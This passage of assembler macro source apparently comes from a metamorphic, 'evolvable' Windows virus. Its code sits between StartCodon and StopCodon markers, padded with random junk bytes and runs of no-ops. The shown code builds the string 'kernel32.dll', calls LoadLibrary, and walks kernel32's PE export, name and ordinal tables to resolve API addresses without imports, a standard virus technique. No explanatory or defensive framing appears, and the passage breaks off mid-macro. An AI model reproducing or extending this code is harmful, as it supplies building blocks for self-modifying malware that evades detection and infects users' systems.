        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 119
db 78
db 52
db 63
db 160
db 95
db 101
db 8
db 73
db 132
db 141
db 73
db 106
db 228
db 18
db 0
db 146
db 91
db 138
db 154
db 125
db 162
db 179
db 128
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopdA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='pi32'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopdA
db StopCodon
db 215
db 157
db 237
db 119
db 242
db 184
db 60
db 192
db 230
db 223
db 246
db 48
db 185
db 158
db 66
db 208
db 162
db 220
db 126
db 225
db 165
db 5
db 117
db 170
db 81
db 163
db 158
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='.dll'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 40
db 161
db 6
db 90
db 30
db 240
db 101
db 233
db 38
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 240
db 254
db 39
db 133
db 180
db 5
db 35
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
    _getDO
    BigNum=stDLLkernel32-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
       _CallAPILoadLibrary      ; invoke LoadLibrary, "kernel32.dll"
    _getDO
db StopCodon
db 147
db 183
db 203
db 33
db 64
db 231
db 154
db 217
db 121
db 177
db 61
db 90
db 34
db 51
db 255
db 0
db 166
db 27
db 218
db 52
db 60
db 32
db 250
db 2
db 163
db 142
db 166
db 231
db 198
db 13
db 248
db 27
db 21
db 231
db 199
db 16
db 89
db 170
db 101
db 136
db 115
db 56
db 149
db 215
db 188
db 239
db StartCodon
    BigNum=hDLLlibrary32-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopsA
       _writeDWord              ; mov dword[hDLLkernel32], eax
       _save                    ; Save kernel32.dll position
    BigNum=0x3C
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 173
db 162
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata                 ; mov RegB, dword[hDLLkernel32+0x3C]
                                ; = Pointer to PE Header of kernel32.dll
       _addsaved                ; relative -> absolut
    BigNum=0x78
    AlreadyStarted=0
db StopCodon
db 193
db 245
db 37
db 0
db 84
db 22
db 143
db 27
db 255
db 10
db 172
db 195
db 35
db 170
db 239
db 191
db 114
db 184
db 158
db 180
db 129
db 96
db 139
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 42
db 217
db 229
db 58
db 33
db 239
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push                   ; save BC1
db StopCodon
db 244
db 136
db 160
db 45
db 213
db 239
db 224
db 189
db 34
db 113
db 22
db 233
db 65
db 10
db 5
db 96
db 120
db 187
db 119
db 164
db 109
db 57
db 27
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata                 ; Export Tables
       _addsaved                ; relative -> absolut
    BigNum=0x1C
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 128
db 22
db 201
db 171
db 89
db 116
db 31
db 37
db 181
db 13
db 191
db 108
db 36
db 227
db 59
db 105
db 246
db 200
db 24
db 69
db 177
db 249
db 184
db 159
db 230
db 254
db 224
db 123
db 199
db 38
db 91
db 151
db 162
db 130
db 139
db 187
db 150
db 185
db 195
db 1
db 243
db 238
db 244
db 20
db 254
db 36
db 69
db 126
db 110
db 231
db 126
db 12
db 83
db 141
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 70
db 114
db 17
db 53
db 134
db 217
db 195
db 53
db 207
db 56
db 96
db 216
db 116
db 69
db 160
db 244
db 49
db 196
db 164
db 123
db 179
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdA                   ; temporarily save Offset of Addresse Table in RegA
    _getDO
    BigNum=hAddressTable-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 210
db 226
db 223
db 40
db 18
db 174
db 58
db 91
db 164
db 62
db 47
db 255
db 218
db 245
db 191
db 200
db 65
db 135
db 98
db 223
db 221
db 246
db 54
db 254
db 181
db 159
db 124
db 143
db 169
db 3
db 215
db 179
db 188
db 5
db 81
db 160
db 103
db 53
db 132
db 141
db 28
db 168
db 108
db 140
db 153
db 56
db 8
db 197
db 194
db 16
db 8
db 20
db 163
db 48
db 156
db 114
db 114
db 194
db 132
db 243
db 255
db 130
db 0
db 208
db 6
db 35
db 64
db 77
db 199
db 71
db 49
db 149
db 110
db 17
db 33
db 46
db 30
db 242
db 217
db 76
db 227
db 249
db 207
db 43
db 219
db 184
db 230
db 181
db 178
db 20
db 64
db 131
db 113
db 95
db 8
db 102
db 113
db 118
db 116
db 73
db 51
db 153
db 134
db 145
db 235
db 101
db 169
db 208
db 18
db 54
db 161
db 95
db 82
db 190
db 191
db 254
db 222
db 127
db 200
db 114
db 49
db 93
db 60
db 99
db 213
db 113
db 130
db 88
db 104
db 141
db 39
db 43
db 181
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff              ; WriteOffset=hAddressTable
       _nopsA                   ; restore RegA=Addresse Tables
       _getdata                 ; Pointer To Addresse Table
       _addsaved                ; relative -> absolut
db StopCodon
db 28
db 141
db 11
db 132
db 146
db 127
db 77
db 113
db 189
db 254
db 108
db 208
db 191
db 126
db 156
db 206
db 36
db 121
db 95
db 212
db 91
db 240
db 185
db 167
db 85
db 163
db 190
db 131
db 204
db 187
db 235
db 82
db 131
db 242
db 188
db 150
db 223
db 150
db 227
db StartCodon
       _writeDWord              ; mov dword[hAddressTable], (Pointer to Addresse Table)
    _getDO
    BigNum=hNamePointerTable-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 48
db 250
db 180
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 247
db 108
db 38
db 234
db 92
db 69
db 123
db 57
db 205
db 111
db 158
db 131
db 215
db 24
db 92
db 37
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff              ; WriteOffset=hNamePointerTable
       _nopsA                   ; BC1=Addresse Table
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 211
db 169
db 184
db 29
db 16
db 72
db 86
db 226
db 37
db 120
db 119
db 14
db 23
db 16
db 87
db 58
db 168
db 127
db 94
db 40
db 45
db 119
db 231
db 55
db 193
db 44
db 174
db 119
db 177
db 178
db 196
db 130
db 51
db 214
db 175
db 12
db 117
db 213
db 254
db 64
db 144
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 61
db 214
db 113
db 215
db 72
db 70
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdA
       _getdata                 ; Pointer To Name Table
       _addsaved                ; relative -> absolut
       _writeDWord              ; mov dword[hNamePointerTable], (Pointer to Name Pointer Table)
    _getDO
    BigNum=hOrdinalTable-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 180
db 112
db 254
db 91
db 208
db 30
db 28
db 25
db 102
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 80
db 61
db 102
db 93
db 89
db 118
db 117
db 249
db 233
db 54
db 13
db 132
db 158
db 93
db 189
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff              ; WriteOffset=hOrdinalTable
       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata                 ; Ordinal Table
       _addsaved                ; relative -> absolut
db StopCodon
db 250
db 244
db 123
db 98
db 100
db 63
db 10
db 5
db 81
db 62
db 46
db 144
db 12
db 83
db 168
db 153
db 101
db 33
db 236
db 193
db 172
db 228
db 103
db 28
db 57
db 5
db 163
db 169
db 149
db 172
db 203
db 219
db 187
db 197
db 229
db 215
db 109
db 184
db 179
db 107
db 112
db 86
db 171
db 53
db 10
db 82
db 252
db 1
db 156
db 216
db 147
db 189
db 19
db 87
db 242
db 41
db 197
db 62
db 2
db 189
db 47
db 145
db 126
db 112
db 242
db 213
db 147
db 70
db 77
db 89
db 232
db 218
db 64
db 17
db 83
db 224
db 55
db 124
db 162
db 201
db 39
db 240
db 218
db 35
db 75
db 178
db 209
db 122
db 87
db 67
db 226
db 93
db 220
db 85
db 4
db 169
db 157
db 104
db 77
db 175
db 185
db 32
db 121
db 136
db 76
db 97
db 33
db 254
db 199
db 42
db 189
db 7
db 67
db 219
db 90
db 18
db 107
db 14
db 230
db 102
db 140
db 39
db 236
db 104
db 30
db 228
db 94
db 235
db 102
db 161
db 253
db 176
db 135
db 246
db 218
db 58
db 64
db 26
db 108
db 46
db 192
db 9
db 75
db 35
db 94
db 189
db 109
db 217
db 151
db 71
db 178
db 179
db 16
db 12
db StartCodon
       _writeDWord              ; mov dword[hOrdinalTable], (Pointer to Ordinal Table)
    _getDO
db StopCodon
db 165
db 40
db 128
db 155
db 124
db 168
db 203
db 98
db 209
db 50
db 115
db 50
db 157
db 54
db 79
db 208
db 153
db 236
db 25
db 149
db 20
db 174
db 47
db 134
db 190
db 170
db 86
db 191
db 235
db 248
db 244
db 177
db 124
db 86
db 22
db 234
db 140
db 37
db 41
db 211
db 220
db 199
db 46
db 75
db 6
db 82
db 119
db 19
db 14
db 7
db 248
db 22
db 156
db 194
db 53
db 156
db 127
db 79
db 164
db 43
db 126
db 16
db 154
db 77
db 247
db 202
db 25
db 21
db 8
db 178
db 153
db 12
db 103
db 84
db 199
db 142
db 192
db 36
db 183
db 162
db 110
db 249
db 243
db 122
db 3
db 192
db 117
db 142
db 50
db 229
db StartCodon
    BigNum=APINumber-DataOffset
    AlreadyStarted=0
db StopCodon
db 249
db 15
db 31
db 54
db 30
db 161
db 159
db 95
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 117
db 222
db 17
db 132
db 104
db 243
db 24
db 208
db 160
db 88
db 191
db 57
db 8
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
    BigNum=APINumberKernel
    AlreadyStarted=0
    if BigNum<25
